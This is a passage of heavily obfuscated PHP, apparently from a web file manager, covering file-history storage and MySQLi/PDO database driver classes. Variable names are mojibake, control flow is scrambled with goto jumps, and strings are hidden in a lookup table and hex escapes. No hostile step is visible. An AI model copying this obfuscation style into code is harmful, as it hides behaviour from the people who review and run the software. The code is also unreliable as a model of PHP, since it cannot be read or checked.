REPEAT_REPLACE, $Fİ¼» ¶‡¦[$aŠÆ«ÓÚ‘[28]]); if ($fñ„´¶¦) { self::remove($EÖƒÙİĞó±, $aˆ†Ë¬¸šŞ); } return $fñ„´¶¦; } } return !1; } public static function setDetail($Fªëå‹„§Ù, $AÅëêÍîŠì, $d…š¤ñ§ê) { $fï²æª‘»Š =& $_SERVER[¢ÌÛ]; $EìØ›¨İ´˜ = self::listData($Fªëå‹„§Ù); if (!$EìØ›¨İ´˜) { return; } foreach ($EìØ›¨İ´˜[$fï²æª‘»Š[363]] as $fËŞ‘îš‰ˆ => $dÇÇŠø«Ç) { if ($dÇÇŠø«Ç[$fï²æª‘»Š[385]] == $AÅëêÍîŠì) { $EìØ›¨İ´˜[$fï²æª‘»Š[363]][$fËŞ‘îš‰ˆ][$fï²æª‘»Š[1103]] = $d…š¤ñ§ê; self::saveData($EìØ›¨İ´˜[$fï²æª‘»Š[1105]], $EìØ›¨İ´˜[$fï²æª‘»Š[363]]); return !0; } } return !1; } public static function fileInfo($EĞÌƒ·«ì½, $D¨ÃÌêÆ‘à) { goto Féê¥Ğíä; c°ßÍ³¶¿: $FÒßÃ˜Å‡ = $c—”ø·îäª[33]; foreach ($Eš³Î©ÎàÉ[$c—”ø·îäª[363]] as $døâ­¯† => $a†Îà‹Èš²) { if ($a†Îà‹Èš²[$c—”ø·îäª[385]] != $D¨ÃÌêÆ‘à) { continue; } $FÒßÃ˜Å‡ = $Eš³Î©ÎàÉ[$c—”ø·îäª[1104]] . $a†Îà‹Èš²[$c—”ø·îäª[28]]; break; } if (!$FÒßÃ˜Å‡) { show_json(LNG($c—”ø·îäª[104]), !1); } goto e¦«˜±ÇËù; Féê¥Ğíä: $c—”ø·îäª =& $_SERVER[¢ÌÛ]; $Eš³Î©ÎàÉ = self::listData($EĞÌƒ·«ì½); if (!$Eš³Î©ÎàÉ) { show_json(LNG($c—”ø·îäª[104]), !1); } goto c°ßÍ³¶¿; e¦«˜±ÇËù: return IO::info($FÒßÃ˜Å‡); goto AˆğãÚ×»ì; AˆğãÚ×»ì: } public static function fileOut($fğà‡¨ğ¼Ï, $d…ì›ƒß´–, $d‚öïÃæª = false) { $F˜ÆÀ§óåÙ =& $_SERVER[¢ÌÛ]; $fÉ‚•’ñÁá = self::fileInfo($fğà‡¨ğ¼Ï, $d…ì›ƒß´–); $AÔÉ°ÂÂôÃ =& $GLOBALS[$F˜ÆÀ§óåÙ[7]]; $d‚öïÃæª = isset($AÔÉ°ÂÂôÃ[$F˜ÆÀ§óåÙ[1070]]) && $AÔÉ°ÂÂôÃ[$F˜ÆÀ§óåÙ[1070]] == 1; if (isset($AÔÉ°ÂÂôÃ[$F˜ÆÀ§óåÙ[29]]) && $AÔÉ°ÂÂôÃ[$F˜ÆÀ§óåÙ[29]] == $F˜ÆÀ§óåÙ[1106]) { return IO::fileOutImage($fÉ‚•’ñÁá[$F˜ÆÀ§óåÙ[75]], $AÔÉ°ÂÂôÃ[$F˜ÆÀ§óåÙ[1107]]); } IO::fileOut($fÉ‚•’ñÁá[$F˜ÆÀ§óåÙ[75]], $d‚öïÃæª, get_path_this($fğà‡¨ğ¼Ï)); } public static function listData($DßÍ¼ïÑŞÇ, $E«Šäëæ¢º = true) { goto cÚ¡†ñ÷; e•è«šÄ†‹: if (substr($DßÍ¼ïÑŞÇ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $E‹³‚ÔòøÖ = self::pathHistory($DßÍ¼ïÑŞÇ); $F‚ô«£…Š = array($bê“ÙÙˆ[1105] => $E‹³‚ÔòøÖ . $bê“ÙÙˆ[1092], $bê“ÙÙˆ[1104] => rtrim(get_path_father($E‹³‚ÔòøÖ), $bê“ÙÙˆ[8]) . $bê“ÙÙˆ[8], $bê“ÙÙˆ[363] => array()); goto BÇÕÑ•¦ÕÑ; BÇÕÑ•¦ÕÑ: $fƒ¹ƒíÈİÆ = IO::getContent($F‚ô«£…Š[$bê“ÙÙˆ[1105]]); if ($fƒ¹ƒíÈİÆ) { $F¼»¡¾½Ñ‰ = json_decode($fƒ¹ƒíÈİÆ, !0); if (is_array($F¼»¡¾½Ñ‰)) { $F‚ô«£…Š[$bê“ÙÙˆ[363]] = $F¼»¡¾½Ñ‰; } } return $F‚ô«£…Š; goto D‹çœŸ¡·ä; cÚ¡†ñ÷: $bê“ÙÙˆ =& $_SERVER[¢ÌÛ]; if ($E«Šäëæ¢º && !IO::exist($DßÍ¼ïÑŞÇ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto e•è«šÄ†‹; D‹çœŸ¡·ä: } private static function saveData($a•ª‹ŞŠ¸×, $b‚ÜªßÕ‹Ğ) { goto BÊò‹•‹ª; EÑÇ‘â›Äô: $d‚©˜¯ôá® = IO::pathFather($a•ª‹ŞŠ¸×); IO::remove($a•ª‹ŞŠ¸×); self::clearEmptyFolder($d‚©˜¯ôá®); goto DÆÄ‘‚Ö³; BÊò‹•‹ª: $bçÄÖËòµ¿ =& $_SERVER[¢ÌÛ]; self::log($bçÄÖËòµ¿[1108] . $a•ª‹ŞŠ¸× . $bçÄÖËòµ¿[67] . count($b‚ÜªßÕ‹Ğ), $bçÄÖËòµ¿[714]); if ($b‚ÜªßÕ‹Ğ) { return IO::setContent($a•ª‹ŞŠ¸×, json_encode($b‚ÜªßÕ‹Ğ)); } goto EÑÇ‘â›Äô; DÆÄ‘‚Ö³: return !0; goto BÃ¦éŠ¡Ôº; BÃ¦éŠ¡Ôº: } public static function clearEmptyFolder($AÃÁó˜÷) { goto eŸ‡Óöî™œ; DêéˆøÅº¾: self::clearEmptyFolder($F¹’œëŠ”†); goto f­¨êÎùˆ; F«½¯ ¯à²: $cáå†¯‘Ã = IO::has($AÃÁó˜÷, !0); if ($cáå†¯‘Ã[$c‘“ƒ³ÜÁ[201]] > 0 || $cáå†¯‘Ã[$c‘“ƒ³ÜÁ[202]] > 0) { return; } IO::remove($AÃÁó˜÷); goto DêéˆøÅº¾; eŸ‡Óöî™œ: $c‘“ƒ³ÜÁ =& $_SERVER[¢ÌÛ]; if (trim($AÃÁó˜÷, $c‘“ƒ³ÜÁ[8]) == trim(self::$_historyBase, $c‘“ƒ³ÜÁ[8])) { return; } $F¹’œëŠ”† = IO::pathFather($AÃÁó˜÷); goto F«½¯ ¯à²; f­¨êÎùˆ: } private static function getBasePath() { goto Cå¡î‘’±; B­’Û¬â¿Š: file_put_contents($b•ÙŠ×â§ . $bÕßÒĞçàÜ[1112], $bÕßÒĞçàÜ[33]); Model($bÕßÒĞçàÜ[1109])->set($bÕßÒĞçàÜ[1110], $b•ÙŠ×â§); return $b•ÙŠ×â§; goto fÅÙ½“Çß©; Cå¡î‘’±: $bÕßÒĞçàÜ =& $_SERVER[¢ÌÛ]; $b•ÙŠ×â§ = Model($bÕßÒĞçàÜ[1109])->get($bÕßÒĞçàÜ[1110]); if (IO::exist($b•ÙŠ×â§)) { return $b•ÙŠ×â§; } goto D‘¬Ò™ôù‰; D‘¬Ò™ôù‰: $b•ÙŠ×â§ = DATA_PATH . $bÕßÒĞçàÜ[1111]; $b•ÙŠ×â§ = IO::mkdir($b•ÙŠ×â§); $b•ÙŠ×â§ = rtrim($b•ÙŠ×â§, $bÕßÒĞçàÜ[8]) . $bÕßÒĞçàÜ[8]; goto B­’Û¬â¿Š; fÅÙ½“Çß©: } } goto dª‰Ô‹˜ãÉ; aŒ¡¨êë„Ç: class DbMysqli extends Db { public function __construct($eà”¥¹¾© = '') { $E†Ü¨àÅÄ¹ =& $_SERVER[¢ÌÛ]; if (!extension_loaded($E†Ü¨àÅÄ¹[749])) { think_exception(think_lang($E†Ü¨àÅÄ¹[10]) . $E†Ü¨àÅÄ¹[849]); } if (!empty($eà”¥¹¾©)) { $this->config = $eà”¥¹¾©; if (empty($this->config[$E†Ü¨àÅÄ¹[13]])) { $this->config[$E†Ü¨àÅÄ¹[13]] = $E†Ü¨àÅÄ¹[33]; } } } public function connect($Cë»¹„ÕÉÖ = '', $EìÀíÔÆç = 0) { $dŞÇÜˆ–Ã× =& $_SERVER[¢ÌÛ]; if (!isset($this->linkID[$EìÀíÔÆç])) { goto d‹˜‰†»êÇ; A™«Ç¾ïñË: $a ¨Ë±±™Ê = $this->linkID[$EìÀíÔÆç]->server_version; $this->linkID[$EìÀíÔÆç]->query($dŞÇÜˆ–Ã×[827] . think_config($dŞÇÜˆ–Ã×[828]) . $dŞÇÜˆ–Ã×[55]); if ($a ¨Ë±±™Ê > $dŞÇÜˆ–Ã×[829]) { $this->linkID[$EìÀíÔÆç]->query($dŞÇÜˆ–Ã×[830]); } goto C†«–‘Äƒ; d‹˜‰†»êÇ: if (empty($Cë»¹„ÕÉÖ)) { $Cë»¹„ÕÉÖ = $this->config; } $this->linkID[$EìÀíÔÆç] = new mysqli($Cë»¹„ÕÉÖ[$dŞÇÜˆ–Ã×[823]], $Cë»¹„ÕÉÖ[$dŞÇÜˆ–Ã×[825]], $Cë»¹„ÕÉÖ[$dŞÇÜˆ–Ã×[826]], $Cë»¹„ÕÉÖ[$dŞÇÜˆ–Ã×[17]], $Cë»¹„ÕÉÖ[$dŞÇÜˆ–Ã×[824]] ? intval($Cë»¹„ÕÉÖ[$dŞÇÜˆ–Ã×[824]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto A™«Ç¾ïñË; C†«–‘Äƒ: $this->connected = !0; if (1 != think_config($dŞÇÜˆ–Ã×[18])) { unset($this->config); } goto b±ò×Ï…ß‚; b±ò×Ï…ß‚: } return $this->linkID[$EìÀíÔÆç]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($D’çù½ø¸È) { goto f—­Çî‰¡ß; f—­Çî‰¡ß: $b·Ù¥ºæÜ =& $_SERVER[¢ÌÛ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto BŞÚÏÑ¿; cÕìœÊ¨Ï: think_status($b·Ù¥ºæÜ[20]); $this->queryID = $this->_linkID->query($D’çù½ø¸È); if ($this->_linkID->more_results()) { while (($Cø„¾½ñæ’ = $this->_linkID->next_result()) != NULL) { $Cø„¾½ñæ’->free_result(); } } goto Aö ÕØ”ê©; Aö ÕØ”ê©: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto a³¾ºÌ–êÉ; BŞÚÏÑ¿: $this->queryStr = $D’çù½ø¸È; if ($this->queryID) { $this->free(); } think_action_status($b·Ù¥ºæÜ[19], 1); goto cÕìœÊ¨Ï; a³¾ºÌ–êÉ: } public function execute($CÁ«îÇé¤–) { goto F²ºì¹æ‰Ÿ; F²ºì¹æ‰Ÿ: $b£¥ÎŒÍé“ =& $_SERVER[¢ÌÛ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto c³Â¥£Ñ§ö; C¼ƒÈÖ•ê×: if (!1 === $b•½´Ä¢å) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto Dä°†Òìù´; c³Â¥£Ñ§ö: $this->queryStr = $CÁ«îÇé¤–; if ($this->queryID) { $this->free(); } think_action_status($b£¥ÎŒÍé“[21], 1); goto D¢éŠÄ”¦; D¢éŠÄ”¦: think_status($b£¥ÎŒÍé“[20]); $b•½´Ä¢å = $this->_linkID->query($CÁ«îÇé¤–); $this->debug(); goto C¼ƒÈÖ•ê×; Dä°†Òìù´: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Dãî½¡   = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Dãî½¡  ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $dÆˆ§ªÏé¾ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$dÆˆ§ªÏé¾) { $this->error(); return !1; } } return !0; } private function getAll() { $A‡±ŞäÃÁ = array(); if ($this->numRows > 0) { for ($a’´·¦™ˆâ = 0; $a’´·¦™ˆâ < $this->numRows; $a’´·¦™ˆâ++) { $A‡±ŞäÃÁ[$a’´·¦™ˆâ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $A‡±ŞäÃÁ; } public function getFields($EÚ‚×Ğ¹Ö¡) { $F¬³„ºÏë‰ =& $_SERVER[¢ÌÛ]; $bœ¥ëì¡¼è = $this->query($F¬³„ºÏë‰[834] . $this->parseKey($EÚ‚×Ğ¹Ö¡)); $EÆÔ”‡Ëƒ® = array(); if ($bœ¥ëì¡¼è) { foreach ($bœ¥ëì¡¼è as $AÌ®ÄÍ™É× => $F‚ƒ–öø–) { $EÆÔ”‡Ëƒ®[$F‚ƒ–öø–[$F¬³„ºÏë‰[27]]] = array($F¬³„ºÏë‰[28] => $F‚ƒ–öø–[$F¬³„ºÏë‰[27]], $F¬³„ºÏë‰[29] => $F‚ƒ–öø–[$F¬³„ºÏë‰[30]], $F¬³„ºÏë‰[31] => (bool) ($F‚ƒ–öø–[$F¬³„ºÏë‰[32]] === $F¬³„ºÏë‰[33]), $F¬³„ºÏë‰[34] => $F‚ƒ–öø–[$F¬³„ºÏë‰[35]], $F¬³„ºÏë‰[36] => strtolower($F‚ƒ–öø–[$F¬³„ºÏë‰[37]]) == $F¬³„ºÏë‰[38], $F¬³„ºÏë‰[39] => strtolower($F‚ƒ–öø–[$F¬³„ºÏë‰[40]]) == $F¬³„ºÏë‰[41]); } } return $EÆÔ”‡Ëƒ®; } public function getTables($DØÄÑ‚çÛ = '') { $f›‹Ô˜Ş =& $_SERVER[¢ÌÛ]; $f•ƒäÊàùÙ = !empty($DØÄÑ‚çÛ) ? $f›‹Ô˜Ş[836] . $DØÄÑ‚çÛ . $f›‹Ô˜Ş[837] : $f›‹Ô˜Ş[838]; $D¹Ç÷Ö¦¸ğ = $this->query($f•ƒäÊàùÙ); $EŞŠ§—‘ù¶ = array(); if ($D¹Ç÷Ö¦¸ğ) { foreach ($D¹Ç÷Ö¦¸ğ as $BÄóãï»Õ§ => $AÅôŒÓÄ¬) { $EŞŠ§—‘ù¶[$BÄóãï»Õ§] = current($AÅôŒÓÄ¬); } } return $EŞŠ§—‘ù¶; } public function replace($eÛÙÈ¿Ûè†, $AìØ†Ï˜ˆó = array()) { $DÇ«‚„Ÿ¹¿ =& $_SERVER[¢ÌÛ]; foreach ($eÛÙÈ¿Ûè† as $a…ÅŸëÕÂ => $D¥ãÑ×˜ÏÓ) { $c¡ğÂğë® = $this->parseValue($D¥ãÑ×˜ÏÓ); if (is_scalar($c¡ğÂğë®)) { $aÃêâ°·Æ[] = $c¡ğÂğë®; $a“¤¹†‚‰µ[] = $this->parseKey($a…ÅŸëÕÂ); } } $E›ƒ¥ˆËÄÅ = $DÇ«‚„Ÿ¹¿[839] . $this->parseTable($AìØ†Ï˜ˆó[$DÇ«‚„Ÿ¹¿[275]]) . $DÇ«‚„Ÿ¹¿[840] . implode($DÇ«‚„Ÿ¹¿[47], $a“¤¹†‚‰µ) . $DÇ«‚„Ÿ¹¿[841] . implode($DÇ«‚„Ÿ¹¿[47], $aÃêâ°·Æ) . $DÇ«‚„Ÿ¹¿[842]; return $this->execute($E›ƒ¥ˆËÄÅ); } public function insertAll($D‘¥”Ş³›ã, $F¡ğ·ëáƒ = array(), $BÍ‡Á”à  = false) { goto A‡›ê—¶®; a·Ã¯ô™‚á: $E£¶Ü’Ÿù = ($BÍ‡Á”à  ? $bÁ÷ñíêš[844] : $bÁ÷ñíêš[845]) . $bÁ÷ñíêš[846] . $this->parseTable($F¡ğ·ëáƒ[$bÁ÷ñíêš[275]]) . $bÁ÷ñíêš[840] . implode($bÁ÷ñíêš[47], $cŞªÖ·µÊ”) . $bÁ÷ñíêš[847] . implode($bÁ÷ñíêš[47], $d§³š÷‰˜•); return $this->execute($E£¶Ü’Ÿù); goto bÄƒøÅš…Ô; A‡›ê—¶®: $bÁ÷ñíêš =& $_SERVER[¢ÌÛ]; if (!is_array($D‘¥”Ş³›ã[0])) { return !1; } $cŞªÖ·µÊ” = array_keys($D‘¥”Ş³›ã[0]); goto FßÚùïÏ˜Ú; FßÚùïÏ˜Ú: $d§³š÷‰˜• = array(); foreach ($D‘¥”Ş³›ã as $døÕºùùˆ‚) { $eÇá–Ë¼¤Œ = array(); foreach ($døÕºùùˆ‚ as $Dòå·ªÏÀØ => $c²Ü‘¨‚¦Ã) { $c²Ü‘¨‚¦Ã = $this->parseValue($c²Ü‘¨‚¦Ã); if (is_scalar($c²Ü‘¨‚¦Ã)) { $eÇá–Ë¼¤Œ[] = $c²Ü‘¨‚¦Ã; } } $d§³š÷‰˜•[] = $bÁ÷ñíêš[256] . implode($bÁ÷ñíêš[47], $eÇá–Ë¼¤Œ) . $bÁ÷ñíêš[842]; } array_walk($cŞªÖ·µÊ”, array($this, $bÁ÷ñíêš[843])); goto a·Ã¯ô™‚á; bÄƒøÅš…Ô: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $C£¥Ü”¸Ñ =& $_SERVER[¢ÌÛ]; $this->error = $this->_linkID->errno . $C£¥Ü”¸Ñ[4] . $this->_linkID->error; if ($C£¥Ü”¸Ñ[33] != $this->queryStr) { $this->error .= LNG($C£¥Ü”¸Ñ[45]) . $this->queryStr; } think_trace($this->error, $C£¥Ü”¸Ñ[33], $C£¥Ü”¸Ñ[46]); return $this->error; } public function escapeString($aí¾Ö¯õ¸‘) { if ($this->_linkID) { return $this->_linkID->real_escape_string($aí¾Ö¯õ¸‘); } else { return addslashes($aí¾Ö¯õ¸‘); } } public function parseKey(&$dâµ©ÆÌÇÙ, $F—Ëìù—İ = true) { $dêÅåæÖÒØ =& $_SERVER[¢ÌÛ]; if ($F—Ëìù—İ) { $dâµ©ÆÌÇÙ = $this->parseKeyCheck($dâµ©ÆÌÇÙ); } if ($dâµ©ÆÌÇÙ != $dêÅåæÖÒØ[182] && !preg_match($dêÅåæÖÒØ[848], $dâµ©ÆÌÇÙ)) { $dâµ©ÆÌÇÙ = $dêÅåæÖÒØ[377] . trim($dâµ©ÆÌÇÙ, $dêÅåæÖÒØ[377]) . $dêÅåæÖÒØ[377]; } return $dâµ©ÆÌÇÙ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($CÃ›÷ÅÛ¨¥ = '') { $Aì …İôƒÇ =& $_SERVER[¢ÌÛ]; if (!class_exists($Aì …İôƒÇ[850])) { think_exception(think_lang($Aì …İôƒÇ[10]) . $Aì …İôƒÇ[851]); } if (!empty($CÃ›÷ÅÛ¨¥)) { $this->config = $CÃ›÷ÅÛ¨¥; if (empty($this->config[$Aì …İôƒÇ[13]])) { $this->config[$Aì …İôƒÇ[13]] = array(); } } } public function connect($C¨›Ê±¼¬ = '', $A´›å¿ÄŸÆ = 0) { $B´ƒÔî­ğ =& $_SERVER[¢ÌÛ]; if (!isset($this->linkID[$A´›å¿ÄŸÆ])) { goto B—·šó‹ŠÌ; B—·šó‹ŠÌ: if (empty($C¨›Ê±¼¬)) { $C¨›Ê±¼¬ = $this->config; } $AÒÎ¢Ôï˜Î = !empty($C¨›Ê±¼¬[$B´ƒÔî­ğ[13]][$B´ƒÔî­ğ[14]]) ? $C¨›Ê±¼¬[$B´ƒÔî­ğ[13]][$B´ƒÔî­ğ[14]] : $this->pconnect; if ($AÒÎ¢Ôï˜Î) { $C¨›Ê±¼¬[$B´ƒÔî­ğ[13]][PDO::ATTR_PERSISTENT] = !0; } goto DÙ¡×ˆ†è×; DÙ¡×ˆ†è×: try { $this->linkID[$A´›å¿ÄŸÆ] = new PDO($C¨›Ê±¼¬[$B´ƒÔî­ğ[852]], $C¨›Ê±¼¬[$B´ƒÔî­ğ[825]], $C¨›Ê±¼¬[$B´ƒÔî­ğ[826]], $C¨›Ê±¼¬[$B´ƒÔî­ğ[13]]); } catch (PDOException $FŸÈæì¦Ô„) { think_exception($FŸÈæì¦Ô„->getMessage()); } $this->dbType = $this->_getDsnType($C¨›Ê±¼¬[$B´ƒÔî­ğ[852]]); if (in_array($this->dbType, array($B´ƒÔî­ğ[853], $B´ƒÔî­ğ[854], $B´ƒÔî­ğ[855], $B´ƒÔî­ğ[856]))) { think_exception($B´ƒÔî­ğ[857] . $this->dbType . $B´ƒÔî­ğ[858] . $this->dbType . $B´ƒÔî­ğ[859]); } goto AŒ…ó»‰Ñ°; AŒ…ó»‰Ñ°: if (!$this->linkID[$A´›å¿ÄŸÆ]) { think_exception($B´ƒÔî­ğ[860]); } try { $this->linkID[$A´›å¿ÄŸÆ]->exec($B´ƒÔî­ğ[861] . think_config($B´ƒÔî­ğ[828])); } catch (Exception $FŸÈæì¦Ô„) { } $this->connected = !0; goto EÖˆÏòÕ«„; EÖˆÏòÕ«„: if (1 != think_config($B´ƒÔî­ğ[18])) { unset($this->config); } goto aŒöäì‡Ò; aŒöäì‡Ò: } return $this->linkID[$A´›å¿ÄŸÆ]; } public function free() { $this->PDOStatement = null; } public function query($fÃŒ™›´ó½, $b¨ª— ÛÉ = array()) { goto C§ßãä´ÄŒ; EÁèÁ¢ï: $this->queryStr = $fÃŒ™›´ó½; if (!empty($b¨ª— ÛÉ)) { $this->queryStr .= $câï¥õò¨[862] . print_r($b¨ª— ÛÉ, !0) . $câï¥õò¨[863]; } if (!empty($this->PDOStatement)) { $this->free(); } goto bßÇ÷Œ´·Ò; C§ßãä´ÄŒ: $câï¥õò¨ =& $_SERVER[¢ÌÛ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto EÁèÁ¢ï; bßÇ÷Œ´·Ò: think_action_status($câï¥õò¨[19], 1); think_status($câï¥õò¨[20]); $this->PDOStatement = $this->_linkID->prepare($fÃŒ™›´ó½); goto E¶½’¸¹Ë•; DîÍÎâºª»: if (!1 === $FÄ·’Èá­Ã) { $this->error(); return !1; } else { return $this->getAll(); } goto Bê˜‡¿ ÁÊ; E¶½’¸¹Ë•: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $FÄ·’Èá­Ã = $this->PDOStatement->execute($b¨ª— ÛÉ); $this->debug(); goto DîÍÎâºª»; Bê˜‡¿ ÁÊ: } public function execute($DÙå‚Ì»ÔØ, $eİ‰‰÷É = array()) { goto C½Ø´ÏÕ; CŸÉ¿Ëƒºñ: think_status($c±ºÅ‘Øá[20]); $this->PDOStatement = $this->_linkID->prepare($DÙå‚Ì»ÔØ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto bË¡­Òã £; D«Î¿±Éàà: $this->queryStr = $DÙå‚Ì»ÔØ; if (!empty($eİ‰‰÷É)) { $this->queryStr .= $c±ºÅ‘Øá[862] . print_r($eİ‰‰÷É, !0) . $c±ºÅ‘Øá[863]; } $C–œóšÒğä = !1; goto BåĞÄ¬¨«Ì; C½Ø´ÏÕ: $c±ºÅ‘Øá =& $_SERVER[¢ÌÛ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto D«Î¿±Éàà; BåĞÄ¬¨«Ì: if ($this->dbType == $c±ºÅ‘Øá[856]) { if (preg_match($c±ºÅ‘Øá[864], $this->queryStr, $c’§•ãÙˆ)) { $this->table = think_config($c±ºÅ‘Øá[865]) . str_ireplace(think_config($c±ºÅ‘Øá[866]), $c±ºÅ‘Øá[370], $c’§•ãÙˆ[2]); $C–œóšÒğä = (bool) $this->query($c±ºÅ‘Øá[867] . strtoupper($this->table) . $c±ºÅ‘Øá[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($c±ºÅ‘Øá[21], 1); goto CŸÉ¿Ëƒºñ; bË¡­Òã £: $B‘œÒ¦¸×˜ = $this->PDOStatement->execute($eİ‰‰÷É); $this->debug(); if (!1 === $B‘œÒ¦¸×˜) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($C–œóšÒğä || preg_match($c±ºÅ‘Øá[868], $DÙå‚Ì»ÔØ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto cİ‚ëİŸİ; cİ‚ëİŸİ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $CÔğá¯Üî = $this->_linkID->commit(); $this->transTimes = 0; if (!$CÔğá¯Üî) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $eÈ‰ÌëÆò = $this->_linkID->rollback(); $this->transTimes = 0; if (!$eÈ‰ÌëÆò) { $this->error(); return !1; } } return !0; } private function getAll() { $fÇ•ªñ¾÷Ï = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($fÇ•ªñ¾÷Ï); return $fÇ•ªñ¾÷Ï; } public function getFields($dÇãì‚²­‡) { goto EòÜ•Ú¼Ÿ; fï¼ó¤Æ£: $bÔªêš’°¨ = $this->query($dô—ÉÛÑ¬®); $f’é¾”Êº• = array(); if ($bÔªêš’°¨) { foreach ($bÔªêš’°¨ as $b•¢¨ĞÒ¬ => $c‘Ô©Ï©†) { $c‘Ô©Ï©† = array_change_key_case($c‘Ô©Ï©†); $c‘Ô©Ï©†[$a¿·Ê¡±æ[28]] = isset($c‘Ô©Ï©†[$a¿·Ê¡±æ[28]]) ? $c‘Ô©Ï©†[$a¿·Ê¡±æ[28]] : $a¿·Ê¡±æ[370]; $c‘Ô©Ï©†[$a¿·Ê¡±æ[29]] = isset($c‘Ô©Ï©†[$a¿·Ê¡±æ[29]]) ? $c‘Ô©Ï©†[$a¿·Ê¡±æ[29]] : $a¿·Ê¡±æ[370]; $dŒÆŞ¨ÅŒâ = isset($c‘Ô©Ï©†[$a¿·Ê¡±æ[269]]) ? $c‘Ô©Ï©†[$a¿·Ê¡±æ[269]] : $c‘Ô©Ï©†[$a¿·Ê¡±æ[28]]; $f’é¾”Êº•[$dŒÆŞ¨ÅŒâ] = array($a¿·Ê¡±æ[28] => $dŒÆŞ¨ÅŒâ, $a¿·Ê¡±æ[29] => $c‘Ô©Ï©†[$a¿·Ê¡±æ[29]], $a¿·Ê¡±æ[31] => (bool) (isset($c‘Ô©Ï©†[$a¿·Ê¡±æ[102]]) && $c‘Ô©Ï©†[$a¿·Ê¡±æ[102]] === $a¿·Ê¡±æ[33] || isset($c‘Ô©Ï©†[$a¿·Ê¡±æ[31]]) && $c‘Ô©Ï©†[$a¿·Ê¡±æ[31]] === $a¿·Ê¡±æ[33]), $a¿·Ê¡±æ[34] => isset($c‘Ô©Ï©†[$a¿·Ê¡±æ[34]]) ? $c‘Ô©Ï©†[$a¿·Ê¡±æ[34]] : (isset($c‘Ô©Ï©†[$a¿·Ê¡±æ[53]]) ? $c‘Ô©Ï©†[$a¿·Ê¡±æ[53]] : $a¿·Ê¡±æ[370]), $a¿·Ê¡±æ[36] => isset($c‘Ô©Ï©†[$a¿·Ê¡±æ[92]]) ? strtolower($c‘Ô©Ï©†[$a¿·Ê¡±æ[92]]) == $a¿·Ê¡±æ[38] : (isset($c‘Ô©Ï©†[$a¿·Ê¡±æ[54]]) ? $c‘Ô©Ï©†[$a¿·Ê¡±æ[54]] : !1), $a¿·Ê¡±æ[39] => isset($c‘Ô©Ï©†[$a¿·Ê¡±æ[885]]) ? strtolower($c‘Ô©Ï©†[$a¿·Ê¡±æ[885]]) == $a¿·Ê¡±æ[41] : (isset($c‘Ô©Ï©†[$a¿·Ê¡±æ[92]]) ? $c‘Ô©Ï©†[$a¿·Ê¡±æ[92]] : !1)); } } goto FÔ¾†İÇ; EòÜ•Ú¼Ÿ: $a¿·Ê¡±æ =& $_SERVER[¢ÌÛ]; $this->initConnect(!0); if (think_config($a¿·Ê¡±æ[869])) { $dô—ÉÛÑ¬® = str_replace($a¿·Ê¡±æ[870], $dÇãì‚²­‡, think_config($a¿·Ê¡±æ[869])); } else { switch ($this->dbType) { case $a¿·Ê¡±æ[853]: case $a¿·Ê¡±æ[871]: $dô—ÉÛÑ¬® = "\123\105\114\x45\x43\124\40\x20\x20\x63\157\154\165\155\156\x5f\x6e\141\155\x65\40\141\x73\x20\47\x4e\x61\155\x65\47\x2c\40\x20\x20\144\x61\164\141\x5f\164\x79\160\145\40\x61\x73\40\x27\124\x79\160\145\47\54\40\40\x20\x63\157\x6c\x75\x6d\x6e\x5f\144\x65\x66\141\x75\154\x74\40\x61\163\x20\47\104\x65\x66\x61\x75\x6c\x74\47\54\40\x20\x20\x69\163\137\156\x75\x6c\x6c\141\x62\x6c\x65\x20\141\x73\x20\x27\116\165\x6c\154\x27\xa\11\11\x46\x52\117\x4d\x9\151\x6e\146\157\162\x6d\x61\x74\151\x6f\156\137\x73\x63\x68\145\155\141\56\x74\141\x62\x6c\x65\163\x20\x41\x53\40\164\xa\11\11\112\x4f\111\x4e\11\151\156\146\x6f\162\155\141\x74\x69\157\x6e\x5f\x73\143\150\x65\x6d\141\x2e\143\157\154\x75\155\156\163\x20\101\123\40\143\xa\x9\11\x4f\116\x20\x20\x74\x2e\x74\141\142\154\145\137\143\141\164\x61\x6c\157\x67\x20\75\40\x63\56\x74\x61\x62\x6c\145\x5f\143\x61\x74\x61\154\157\x67\xa\11\x9\x41\x4e\104\40\x74\56\x74\x61\142\x6c\145\137\163\x63\150\x65\155\x61\40\75\x20\x63\x2e\x74\x61\142\154\145\137\163\143\150\145\155\x61\12\11\x9\x41\116\104\40\164\56\x74\141\142\x6c\x65\137\x6e\x61\155\145\40\75\x20\143\56\x74\x61\142\154\x65\x5f\156\141\x6d\145\xa\x9\11\x57\x48\105\x52\105\40\40\40\x74\56\x74\x61\x62\154\